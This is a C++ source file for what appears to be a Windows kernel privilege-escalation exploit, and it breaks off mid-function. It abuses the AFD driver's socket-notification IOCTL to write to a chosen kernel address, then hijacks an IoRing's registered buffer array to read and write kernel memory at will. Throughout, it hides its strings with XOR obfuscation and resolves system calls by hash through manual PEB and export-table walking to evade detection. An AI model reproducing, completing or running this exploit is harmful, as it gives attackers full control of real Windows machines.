#include "IoRingExploit.hpp"
#include "Console.hpp"
#include "HasherLibrary.hpp"
#include "XorStr.hpp"


#include <iostream>
#include <array>
#include <intsafe.h>



bool IoRingExploit::IoRingExploitInit()
{
	CPrint(xorstr_("IoRing"), xorstr_("Exlploit Init"));
	
	
	this->afdDevice = xorstr_(L"\\Device\\Afd\\Endpoint");
	
	this->ntdllHash = HASHSTRW(xorstr_(L"ntdll.dll"));
	

	this->ntdllHashedNames.ntCreateIoCompletionHash = HASHSTRA(xorstr_("NtCreateIoCompletion"));
	this->ntdllHashedNames.ntRemoveIoCompletionHash = HASHSTRA(xorstr_("NtRemoveIoCompletion"));
	this->ntdllHashedNames.ntSetIoCompletionHash = HASHSTRA(xorstr_("NtSetIoCompletion"));
	this->ntdllHashedNames.ntOpenFileHash = HASHSTRA(xorstr_("NtOpenFile"));
	this->ntdllHashedNames.ntCreateFileHash = HASHSTRA(xorstr_("NtCreateFile"));
	this->ntdllHashedNames.ntDeviceIoControlFileHash = HASHSTRA(xorstr_("NtDeviceIoControlFile"));
	this->ntdllHashedNames.ntQuerySystemInformationHash = HASHSTRA(xorstr_("NtQuerySystemInformation"));
	this->ntdllHashedNames.ntQueryInformationFileHash = HASHSTRA(xorstr_("NtQueryInformationFile"));
	this->ntdllHashedNames.ntAllocateVirtualMemoryHash = HASHSTRA(xorstr_("NtAllocateVirtualMemory"));
	this->ntdllHashedNames.ntFreeVirtualMemoryHash = HASHSTRA(xorstr_("NtFreeVirtualMemory"));
	this->ntdllHashedNames.ntCloseHash = HASHSTRA(xorstr_("NtClose"));
	this->ntdllHashedNames.ntReadFileHash = HASHSTRA(xorstr_("NtReadFile"));
	this->ntdllHashedNames.ntWriteFileHash = HASHSTRA(xorstr_("NtWriteFile"));
	this->ntdllHashedNames.ntCreateEventHash = HASHSTRA(xorstr_("NtCreateEvent"));
	this->ntdllHashedNames.ntCreateIoRingHash = HASHSTRA(xorstr_("NtCreateIoRing"));
	this->ntdllHashedNames.ntCreateNamedPipeFileHash = HASHSTRA(xorstr_("NtCreateNamedPipeFile")); 
	

	if (!this->FetchFunctionPtrsUtil())
	{
		CPrintError(xorstr_("IoRing"), xorstr_("Exlploit Initialization Failed Due To Invalid Function pointer"))
		return false;
	}


	CPrint(xorstr_("IoRing"), xorstr_("Exlploit Initialization Complete"));

	return true;
}



bool IoRingExploit::IoRingWrite(__out PULONG64 registerBuffers, __in ULONG64 writeAddress, __in void* writeBuffer, __in ULONG writeLength)
{
	auto reqFile = IoRingHandleRefFromHandle(this->inputPipeFileHandle);
	auto reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
	auto cqe = std::make_unique<IORING_CQE>(0);
	auto ioStatus = std::make_unique<IO_STATUS_BLOCK>();
	NTSTATUS status = 1;
	HRESULT hrStatus = 1;

	
	
	auto pNtWriteFile = (fnNtWriteFile)this->Fetch_Function(this->ntdllHashedNames.ntWriteFileHash);
	if (!NT_SUCCESS(status = pNtWriteFile(this->inputPipeFileHandle, nullptr,
		nullptr, nullptr, ioStatus.get(), writeBuffer, writeLength, nullptr, nullptr)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("Failed To Write File With ERROR"), U_PTR(status))
		return false;
	}
	
	auto bufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(nullptr, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
	if (!bufferEntry)
		return false;
	
	/*std::size_t szBufferEntry = sizeof(IOP_MC_BUFFER_ENTRY);
	auto pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)this->Fetch_Function(this->ntdllHashedNames.ntAllocateVirtualMemoryHash);
	if (!NT_SUCCESS(status = pNtAllocateVirtualMemory(NtCurrentProcess(), (void**)&bufferEntry, 0, &szBufferEntry, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtAllocateVirtualMemory Failed With ERROR"), U_PTR(status))
		return false;
	}*/
	 
	bufferEntry->Address = C_PTR(writeAddress);
	bufferEntry->Length = writeLength;
	bufferEntry->Type = 0xC02;
	bufferEntry->Size = 0x80;
	bufferEntry->AccessMode = 1;
	bufferEntry->ReferenceCount = 1;

	registerBuffers[0] = U_PTR(bufferEntry);

	if (!HR_SUCCESS(hrStatus = BuildIoRingWriteFile(this->ioRingHandle, reqFile, reqBuffer,
		writeLength, 0, FILE_WRITE_FLAGS_NONE, (UINT_PTR)nullptr, IOSQE_FLAGS_NONE)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("BuildIoRingWriteFile Failed With ERROR"), U_PTR32(hrStatus))
		return false;
	}

	if (!HR_SUCCESS(hrStatus = SubmitIoRing(this->ioRingHandle, 0, 0, nullptr)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("SubmitIoRing Failed With ERROR"), U_PTR32(hrStatus))
		return false;
	}

	if (!HR_SUCCESS(hrStatus = PopIoRingCompletion(this->ioRingHandle, cqe.get())))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("PopIoRingCompletion Failed With ERROR"), U_PTR32(hrStatus))
		return false;
	}

	if (!HR_SUCCESS(cqe.get()->ResultCode))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("Failed To Queue IoRing Entry"), U_PTR32(cqe.get()->ResultCode))
		return false;
	}

	return true;
}




bool IoRingExploit::IoRingRead(__out PULONG64 registerBuffers, __in ULONG64 readAddress, __in void* readBuffer, __in ULONG readLength)
{
	auto reqFile = IoRingHandleRefFromHandle(this->outputPipeFileHandle);
	auto reqBuffer = IoRingBufferRefFromIndexAndOffset(0, 0);
	auto cqe = std::make_unique<IORING_CQE>();
	NTSTATUS status = 1;
	HRESULT hrStatus = 1;

	
	auto bufferEntry = (PIOP_MC_BUFFER_ENTRY)VirtualAlloc(nullptr, sizeof(IOP_MC_BUFFER_ENTRY), MEM_COMMIT, PAGE_READWRITE);
	if (!bufferEntry)
		return false;

	/*std::size_t szBufferEntry = sizeof(IOP_MC_BUFFER_ENTRY);
	auto pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)this->Fetch_Function(this->ntdllHashedNames.ntAllocateVirtualMemoryHash);
	if (!NT_SUCCESS(status = pNtAllocateVirtualMemory(NtCurrentProcess(), (void**)&bufferEntry, 0, &szBufferEntry, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtAllocateVirtualMemory Failed With ERROR"), U_PTR(status))
		return false;
	}*/

	bufferEntry->Address = C_PTR(readAddress);
	bufferEntry->Length = readLength;
	bufferEntry->Type = 0xC02;
	bufferEntry->Size = 0x80;
	bufferEntry->AccessMode = 1;
	bufferEntry->ReferenceCount = 1;

	
	registerBuffers[0] = U_PTR(bufferEntry);

	
	if (!HR_SUCCESS(hrStatus = BuildIoRingWriteFile(this->ioRingHandle, reqFile, reqBuffer,
		readLength, 0, FILE_WRITE_FLAGS_NONE, (UINT_PTR)nullptr, IOSQE_FLAGS_NONE)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("BuildIoRingWriteFile Failed With ERROR"), U_PTR32(hrStatus))
		return false;
	}

	if (!HR_SUCCESS(hrStatus = SubmitIoRing(this->ioRingHandle, 0, 0, nullptr)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("SubmitIoRing Failed With ERROR"), U_PTR32(hrStatus))
		return false;
	}

	if (!HR_SUCCESS(hrStatus = PopIoRingCompletion(this->ioRingHandle, cqe.get())))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("PopIoRingCompletion Failed With ERROR"), U_PTR32(hrStatus))
		return false;
	}

	if (!HR_SUCCESS(cqe.get()->ResultCode))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("Failed To Queue IoRing Entry"), LONG(cqe.get()->ResultCode))
		return false;
	}

	return true;
}



bool IoRingExploit::IoRingSetup(__in PIORING_OBJECT* ioRingObjPtr)
{
	auto ioRingFlags = std::make_unique<IORING_CREATE_FLAGS>();
	auto inputPipeAtts = std::make_unique<OBJECT_ATTRIBUTES>(0);
	auto outputPipeAtts = std::make_unique<OBJECT_ATTRIBUTES>(0);
	auto ioStatus= std::make_unique<IO_STATUS_BLOCK>();
	auto inputPipeUniStr = std::make_unique<UNICODE_STRING>(0);
	auto outputPipeUniStr = std::make_unique<UNICODE_STRING>(0);
	auto pipetimeout = std::make_unique<LARGE_INTEGER>();
	NTSTATUS status = 1;
	HRESULT hrStatus = 1;

	
	
	ioRingFlags.get()->Advisory = IORING_CREATE_ADVISORY_FLAGS_NONE;
	ioRingFlags.get()->Required = IORING_CREATE_REQUIRED_FLAGS_NONE;

	if (!HR_SUCCESS(hrStatus = CreateIoRing(IORING_VERSION_3, *ioRingFlags.get(), 0x10000, 0x20000, &this->ioRingHandle)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("CreateIoRing Failed With ERROR"), U_PTR(hrStatus))
		return false;
	}


	
	if (!this->FetchObjectPtrUtil(GetCurrentProcessId(), *(PHANDLE)this->ioRingHandle, (PULONG64)ioRingObjPtr))
	{
		return false;
	}

	this->ioRingObject = *ioRingObjPtr;
	pipetimeout.get()->QuadPart = 0;
	
	InitializeUnicodeString(inputPipeUniStr.get(), xorstr_(L"\\??\\pipe\\inputRing"));
	InitializeObjectAttributes(inputPipeAtts.get(), inputPipeUniStr.get(), OBJ_CASE_INSENSITIVE, nullptr, nullptr);

	InitializeUnicodeString(outputPipeUniStr.get(), xorstr_(L"\\??\\pipe\\outputRing"));
	InitializeObjectAttributes(outputPipeAtts.get(), outputPipeUniStr.get(), OBJ_CASE_INSENSITIVE, nullptr, nullptr);

	/*auto pNtCreateNamedPipeFile = (fnNtCreateNamedPipeFile)this->Fetch_Function(this->ntdllHashedNames.ntCreateNamedPipeFileHash);

	if (!NT_SUCCESS(status = pNtCreateNamedPipeFile(&this->inputPipeHandle, GENERIC_ALL | SYNCHRONIZE,
		inputPipeAtts.get(), ioStatus.get(), FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT,
		FILE_PIPE_BYTE_STREAM_TYPE, FILE_PIPE_BYTE_STREAM_MODE, FILE_PIPE_COMPLETE_OPERATION, 255, PAGE_SIZE, PAGE_SIZE, pipetimeout.get())))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtCreateNamedPipeFile Failed With ERROR"), U_PTR(status))
		this->IoRingSetupCleanup();
		return false;
	}

	if (!NT_SUCCESS(status = pNtCreateNamedPipeFile(&this->outputPipeHandle, GENERIC_ALL | SYNCHRONIZE,
		outputPipeAtts.get(), ioStatus.get(), FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT,
		FILE_PIPE_BYTE_STREAM_TYPE, FILE_PIPE_BYTE_STREAM_MODE, FILE_PIPE_COMPLETE_OPERATION, 255, PAGE_SIZE, PAGE_SIZE, pipetimeout.get())))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtCreateNamedPipeFile Failed With ERROR"), U_PTR(status))
		this->IoRingSetupCleanup();
		return false;
	}*/
	
	
	
	
	this->inputPipeHandle = CreateNamedPipe(xorstr_(L"\\\\.\\pipe\\inputRing"), PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, nullptr);
	this->outputPipeHandle = CreateNamedPipe(xorstr_(L"\\\\.\\pipe\\outputRing"), PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, nullptr);

	if (!this->inputPipeHandle || !this->outputPipeHandle)
	{
		CAppendedPrintError(xorstr_("IoRing"), xorstr_("Failed To Create Pipes"))
		this->IoRingSetupCleanup();
		return false;
	}


	this->inputPipeFileHandle = CreateFile(L"\\\\.\\pipe\\inputRing", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	this->outputPipeFileHandle = CreateFile(L"\\\\.\\pipe\\outputRing", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!this->inputPipeFileHandle || !this->outputPipeFileHandle)
	{
		CAppendedPrintError(xorstr_("IoRing"), xorstr_("Failed To Open Pipes"))
		this->IoRingSetupCleanup();
		return false;
	}

	/*auto pNtCreateFile = (fnNtCreateFile)this->Fetch_Function(this->ntdllHashedNames.ntCreateFileHash);

	if (!NT_SUCCESS(status = pNtCreateFile(&this->inputPipeFileHandle, GENERIC_ALL,
		inputPipeAtts.get(), ioStatus.get(), nullptr, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_ALWAYS,
		FILE_SYNCHRONOUS_IO_NONALERT, nullptr, 0)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtCreateFile Failed With ERROR"), U_PTR(status))
		this->IoRingSetupCleanup();
		return false;
	}

	if (!NT_SUCCESS(status = pNtCreateFile(&this->outputPipeFileHandle, GENERIC_ALL,
		outputPipeAtts.get(), ioStatus.get(), nullptr, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, OPEN_ALWAYS,
		FILE_SYNCHRONOUS_IO_NONALERT, nullptr, 0)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtCreateFile Failed With ERROR"), U_PTR(status))
		this->IoRingSetupCleanup();
		return false;
	}*/


	auto pNtAllocateVirutalMemory = (fnNtAllocateVirtualMemory)this->Fetch_Function(this->ntdllHashedNames.ntAllocateVirtualMemoryHash);
	if (!this->fakeRegBuffer)
	{
		std::size_t targetszAlloc = sizeof(ULONG64);

		if (!NT_SUCCESS(status = pNtAllocateVirutalMemory(NtCurrentProcess(), &this->targetAddress, 0, &targetszAlloc, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
		{
			CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtAllocateVirtualMemory Failed With ERROR"), U_PTR(status))
			this->IoRingSetupCleanup();
			return false;
		}
		this->fakeRegBuffer = this->targetAddress;
	}

	return true;

}

void IoRingExploit::IoRingSetupCleanup()
{
	auto pNtClose = (fnNtCLose)this->Fetch_Function(this->ntdllHashedNames.ntCloseHash);
	auto pNtFreeVirutalMemory = (fnNtFreeVirtualMemory)this->Fetch_Function(this->ntdllHashedNames.ntFreeVirtualMemoryHash);

	
	if (this->inputPipeFileHandle != nullptr) pNtClose(this->inputPipeFileHandle);
	if (this->outputPipeFileHandle != nullptr) pNtClose(this->outputPipeFileHandle);
    if (this->inputPipeHandle != nullptr) pNtClose(this->inputPipeHandle);
	if (this->outputPipeHandle != nullptr) pNtClose(this->outputPipeHandle);

	std::size_t szFakeBufferAlloc = sizeof(ULONG64);
	if (this->fakeRegBuffer)
	{
		pNtFreeVirutalMemory(NtCurrentProcess(), this->fakeRegBuffer, &szFakeBufferAlloc, MEM_RELEASE);
	}
}


bool IoRingExploit::IoRingWriteHelper(__in ULONG64 writeAddress, void* writeBuffer, __in ULONG writeLength)
{
	volatile auto handleStruct = *(_HIORING**)&this->ioRingHandle;
	handleStruct->RegBufferArray = this->fakeRegBuffer;
	handleStruct->BufferArraySize = 1;
	return this->IoRingRead((PULONG64)this->fakeRegBuffer, writeAddress, writeBuffer, writeLength);
}



bool IoRingExploit::IoRingReadHelper(__in ULONG64 readAddress, void* readBuffer, __in ULONG readLength)
{
	volatile auto handleStruct = *(_HIORING**)&this->ioRingHandle;
	handleStruct->RegBufferArray = this->fakeRegBuffer;
	handleStruct->BufferArraySize = 1;
	return this->IoRingRead((PULONG64)this->fakeRegBuffer, readAddress, readBuffer, readLength);
}


bool IoRingExploit::IoRingRundownProtection()
{
	std::array<std::byte, 0x10> zeroMem{};
	this->IoRingWrite((PULONG64)this->fakeRegBuffer, (ULONG64)this->ioRingObject->RegBuffersCount, &zeroMem, 0x10);
	return true;
}


bool IoRingExploit::WriteExploit(void* targetAddress, __in void* extendedAttributes, __in std::size_t szExtendedAttributes)
{
	NTSTATUS status = 1;
	auto fileAtts = std::make_unique<OBJECT_ATTRIBUTES>(0);
	auto ioStatus = std::make_unique<IO_STATUS_BLOCK>();
	auto uniStr = std::make_unique<UNICODE_STRING>(0);
	
	auto pNtClose = (fnNtCLose)this->Fetch_Function(this->ntdllHashedNames.ntCloseHash);
	

	
	if (!this->completionHandle)
	{
		auto pNtCreateIoCompletion = (fnNtCreateIoCompletion)this->Fetch_Function(this->ntdllHashedNames.ntCreateIoCompletionHash);
		if (!NT_SUCCESS(status = pNtCreateIoCompletion(&this->completionHandle, MAXIMUM_ALLOWED, nullptr, 1)))
		{
			CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtCreateIoCompletion Failed With ERROR"), U_PTR(status))
			return false;
		}
	}
	
	
	auto pNtSetIoCompletion = (fnNtSetIoCompletion)this->Fetch_Function(this->ntdllHashedNames.ntSetIoCompletionHash);
	if (!NT_SUCCESS(status = pNtSetIoCompletion(completionHandle, 0x1337, (UINT_PTR)ioStatus.get(), 0, 0x100)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtSetIoCompletion Failed With ERROR"), U_PTR(status))
		if (completionHandle) pNtClose(completionHandle);
		return false;
	}

	InitializeUnicodeString(uniStr.get(), this->afdDevice.data());
	InitializeObjectAttributes(fileAtts.get(), uniStr.get(), OBJ_CASE_INSENSITIVE, nullptr, nullptr);

	if (!this->socketHandle)
	{
		auto pNtCreateFile = (fnNtCreateFile)this->Fetch_Function(this->ntdllHashedNames.ntCreateFileHash);
		if (!NT_SUCCESS(status = pNtCreateFile(&this->socketHandle, MAXIMUM_ALLOWED, fileAtts.get(), ioStatus.get(),
			nullptr, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, 1, 0,
			extendedAttributes, szExtendedAttributes)))
		{
			CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtCreateFile Failed With ERROR"), U_PTR(status))
			if (completionHandle) pNtClose(completionHandle);
			return false;
		}
	}
	

	auto afdSockData = std::make_unique<AFD_NOTIFYSOCK_DATA>();
	afdSockData.get()->Completion = completionHandle;
	afdSockData.get()->Counter = 0x1;
	afdSockData.get()->Length = 0x1;
	afdSockData.get()->Timeout = 100000000;
	afdSockData.get()->PwnPtr = targetAddress;
	
	
	std::size_t szAlloc = (PAGE_SIZE * 2);
	auto pNtFreeVirtualMemory = (fnNtFreeVirtualMemory)this->Fetch_Function(this->ntdllHashedNames.ntFreeVirtualMemoryHash);

	auto pNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)this->Fetch_Function(this->ntdllHashedNames.ntAllocateVirtualMemoryHash);
	if (!NT_SUCCESS(status = pNtAllocateVirtualMemory(NtCurrentProcess(), &afdSockData.get()->Data1, 0 ,&szAlloc, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
	{
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtAllocateVirtualMemory Failed With ERROR"), U_PTR(status))
		this->ExploitCleanup(FREE_AFD_HANDLE);
		return false;
	}

	if (!NT_SUCCESS(status = pNtAllocateVirtualMemory(NtCurrentProcess(), &afdSockData.get()->Data2, 0, &szAlloc, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
	{		
		CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtAllocateVirtualMemory Failed With ERROR"), U_PTR(status))
		pNtFreeVirtualMemory(NtCurrentProcess(), afdSockData.get()->Data1, &szAlloc, MEM_RELEASE);
		this->ExploitCleanup(FREE_AFD_HANDLE);
		return false;
	}


	if (afdSockData.get()->Data1 == nullptr || afdSockData.get()->Data2 == nullptr)
	{
		this->ExploitCleanup(FREE_AFD_HANDLE);
		return false;
	}

	
	if (!this->eventHandle)
	{
		auto pNtCreateEvent = (fnNtCreateEvent)this->Fetch_Function(this->ntdllHashedNames.ntCreateEventHash);
		if (!NT_SUCCESS(status = pNtCreateEvent(&eventHandle, EVENT_ALL_ACCESS, nullptr, SynchronizationEvent, true)))
		{
			CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtCreateEvent Failed With ERROR"), U_PTR(status))
			pNtFreeVirtualMemory(NtCurrentProcess(), afdSockData.get()->Data1, &szAlloc, MEM_RELEASE);
			pNtFreeVirtualMemory(NtCurrentProcess(), afdSockData.get()->Data2, &szAlloc, MEM_RELEASE);
			this->ExploitCleanup(FREE_AFD_HANDLE);
			return false;
		}
	}
	

	auto pNtDeviceIoControlFile = (fnNtDeviceIoControlFile)this->Fetch_Function(this->ntdllHashedNames.ntDeviceIoControlFileHash);
	pNtDeviceIoControlFile(socketHandle, eventHandle, nullptr, nullptr, ioStatus.get(), AFD_NOTIFYSOCK_IOCTL, afdSockData.get(), 0x30, nullptr, 0);
	///we dont care what that status is

	if (afdSockData.get()->Data1 == nullptr || afdSockData.get()->Data2 == nullptr)
	{	
		pNtFreeVirtualMemory(NtCurrentProcess(), afdSockData.get()->Data1, &szAlloc, MEM_RELEASE);
		pNtFreeVirtualMemory(NtCurrentProcess(), afdSockData.get()->Data2, &szAlloc, MEM_RELEASE);
	}
	
	this->ExploitCleanup(HOLD_AFD_HANDLE);
	return true;
}


void IoRingExploit::ExploitCleanup(__in ULONG handleFreeFlag)
{
	if (handleFreeFlag == FREE_AFD_HANDLE)
	{
		auto pNtClose = (fnNtCLose)this->Fetch_Function(this->ntdllHashedNames.ntCloseHash);
		if (this->completionHandle) pNtClose(this->completionHandle);
		if (this->socketHandle) pNtClose(this->socketHandle);
		if (this->eventHandle) pNtClose(this->eventHandle);
	}
}




bool IoRingExploit::FetchObjectPtrUtil(__in ULONG procPid, __in HANDLE targetHandle, __out PULONG64 objectPtr)
{
	auto handleInfo = PSYSTEM_HANDLE_INFORMATION{ nullptr };
	ULONG				  szBuffer = 0;
	NTSTATUS				status = 1;
	HRESULT				  hrStatus = 1;
	
	auto pNtQuerySystemInformation = (fnNtQuerySystemInformation)this->Fetch_Function(this->ntdllHashedNames.ntQuerySystemInformationHash);


	do
	{
		status = pNtQuerySystemInformation(SystemHandleInformation, nullptr, szBuffer, &szBuffer);

		szBuffer += 0x60;

		handleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szBuffer);
		if (handleInfo)
		{

			status = pNtQuerySystemInformation(SystemHandleInformation, handleInfo, szBuffer, &szBuffer);
			if (status != 0x0) HeapFree(GetProcessHeap(), 0, handleInfo);
		}
		else
		{
			CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtQuerySystemInformation Failed With ERROR"), U_PTR(status))
			return false;
		}


	} while (status == STATUS_INFO_LENGTH_MISMATCH);

	USHORT sPid = 0;
	USHORT sHandle = 0;
	if (!HR_SUCCESS(hrStatus = ULongToUShort(procPid, &sPid))) return false;
	if (!HR_SUCCESS(hrStatus = ULongToUShort((ULONG)targetHandle, &sHandle))) return false;
	

	auto handleEntry = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)handleInfo->Handle;
	for (ULONG i = 0; i < handleInfo->Count; handleEntry++, i++)
	{
		
		
		if (handleEntry->UniqueProcessId == sPid &&
			handleEntry->HandleValue == sHandle)
		{
			*objectPtr = (ULONG64)handleEntry[i].Object;
			HeapFree(GetProcessHeap(), 0, handleInfo);
			return true;
		}
	}

	CAppendedPrintError(xorstr_("IoRing"), xorstr_("Failed To Fetch Object"))
	return false;
}




PIMAGE_NT_HEADERS64 IoRingExploit::FetchNtHeaderUtil(__in void* imageBase)
{

	auto dosHeader = (PIMAGE_DOS_HEADER)((PBYTE)imageBase);
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		CPrintError(xorstr_("IoRing"), xorstr_("FetchNtHeaderUtil; Failed DOS Signature Check"))
		return nullptr;
	}

	auto ntHeader = (PIMAGE_NT_HEADERS64)(((PBYTE)imageBase) + dosHeader->e_lfanew);
	if (ntHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		CPrintError(xorstr_("IoRing"), xorstr_("FetchNtHeaderUtil; Failed NT Signature Check"))
		return nullptr;
	}

	return ntHeader;
}



void* IoRingExploit::FetchModuleBaseUtil(__in std::uint32_t moduleNameHash)
{
	
	auto moduleInfo = PSYSTEM_MODULE_INFORMATION { 0 };
	ULONG				  szBuffer = 0;
	NTSTATUS				status = 1;
	char* currentModule = { nullptr };
	void* moduleBase = nullptr;
	
	auto pNtQuerySystemInformation = (fnNtQuerySystemInformation)this->Fetch_Function(this->ntdllHashedNames.ntQuerySystemInformationHash);


	do
	{
		status = pNtQuerySystemInformation(SystemModuleInformation, nullptr, szBuffer, &szBuffer);

		szBuffer += 0x60;
		
		moduleInfo = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szBuffer);
		if (moduleInfo)
		{
			
			status = pNtQuerySystemInformation(SystemModuleInformation, moduleInfo, szBuffer, &szBuffer);
			if (status != 0x0) HeapFree(GetProcessHeap(), 0, moduleInfo);
		}
		else
		{
			CAppendedPrintErrorCode(xorstr_("IoRing"), xorstr_("NtQuerySystemInformation Failed With ERROR"), status);
			
			return nullptr;
		}


	} while (status == STATUS_INFO_LENGTH_MISMATCH);


	auto moduleEntry = (PSYSTEM_MODULE_ENTRY)moduleInfo->Module;

	for (ULONG i = 0; i < moduleInfo->Count; moduleEntry++, i++)
	{

		currentModule = (char*)(moduleEntry->FullPathName + moduleEntry->OffsetToFileName);
		
		if (Rsh.String_cmp(moduleNameHash, currentModule) &&
			moduleEntry->ImageBase != nullptr)
		{
			moduleBase = moduleEntry->ImageBase;
			HeapFree(GetProcessHeap(), 0, moduleInfo);
			return moduleBase;
		}
	}

	CAppendedPrintError(xorstr_("IoRing"), xorstr_("Failed To Fetch Module Base"));
	return nullptr;
}



static bool MemCompareUtil(__in void* memory, __in void* signature, __in std::size_t sigLength)
{
	if (std::memcmp(memory, signature, sigLength) == 0) return true;

	return false;
}

void* IoRingExploit::SigScannerUtil(__in void* memoryRegion, __in std::size_t length, __in void* sigBuffer, __in std::size_t sigLength)
{

	for (std::size_t len = 0; len < length; len++)
	{

		if (MemCompareUtil(C_PTR((U_PTR(memoryRegion) + len)), sigBuffer, sigLength))
		{
			return C_PTR((U_PTR(memoryRegion) + len));
		}
	}

	return nullptr;
}



/// <summary>
/// all structure variables must be the same
/// </summary>
template <typename S> std::uint32_t* GetBegin(S* structure)
{
	return (std::uint32_t*)(std::uint32_t*)structure;
}

template <typename S> std::uint32_t* GetEnd(S* structure)
{
	auto varCount = (sizeof(*structure) / sizeof(std::uint32_t)) - 1;
	return (std::uint32_t*)((std::uint32_t*)structure + varCount);
}

bool IoRingExploit::FetchFunctionPtrsUtil()
{
	CAppendedPrint(xorstr_("IoRing"), xorstr_("Fetching All Function Pointers..."))

	auto tempPtrs = FUNCTION_PTRS { nullptr };
	std::uint32_t nonPtr;

	for (auto ptr = GetBegin(&this->ntdllHashedNames); ptr < GetEnd(&this->ntdllHashedNames) + 1; ptr++)
	{
		nonPtr = *ptr;

		tempPtrs.function_Ptr = this->FunctionAddrUtil(this->ntdllHash, nonPtr);
		tempPtrs.hashedName = nonPtr;

		if (!tempPtrs.function_Ptr)return false;
		
		this->functionPointers.push_back(tempPtrs);
	}


	CPrintBland(xorstr_("Successful"))
	return true;
}





void* IoRingExploit::FunctionAddrUtil( __in std::uint_least32_t hashedModuleName, __in std::uint32_t hashedProcName)
{
	
	auto pBase = this->PebModuleUtil(hashedModuleName);
	
	auto ntHeader = (PIMAGE_NT_HEADERS64)this->FetchNtHeaderUtil(pBase);
	

	if ((ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress) == 0)
	{
		CPrintError(xorstr_("IoRing"), xorstr_("Failed To Find Image Directory Entry Point"))
		return nullptr;
	}

	auto szExportDir = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	auto exportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	if (!exportDir)
	{
		CPrintError(xorstr_("IoRing"), xorstr_("Failed To Fetch Export Directory"))
		return nullptr;
	}



	auto  nameArray = (PDWORD)(pBase + exportDir->AddressOfNames);
	auto  ordinal = (PWORD)(pBase + exportDir->AddressOfNameOrdinals);
	auto  addressArray = (PDWORD)(pBase + exportDir->AddressOfFunctions);

	for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
	{
		auto name = (char*)(pBase + nameArray[i]);
		auto pFunctionAddress = (void*)(pBase + addressArray[ordinal[i]]);


		if (name && Rsh.String_cmp(hashedProcName, name) == true)
		{
			return pFunctionAddress;
		}
	}

	CPrintError(xorstr_("IoRing"), xorstr_("Failed To Fetch Function Address"));
	return nullptr;
}




PBYTE IoRingExploit::PebModuleUtil(__in std::uint32_t hashedModuleName)
{
	auto peb = (PPEB64)__readgsqword(0x60);
	PLDR_DATA_TABLE_ENTRY64 entry = nullptr;


	auto pLdr = peb->Ldr;
	if (!pLdr)
	{
		CPrintError(xorstr_("IoRing"), xorstr_("Failed To Fetch Peb"));
		return nullptr;
	}

	auto ldrEntry = (PLDR_DATA_TABLE_ENTRY64)pLdr->InMemoryOrderModuleList.Flink;
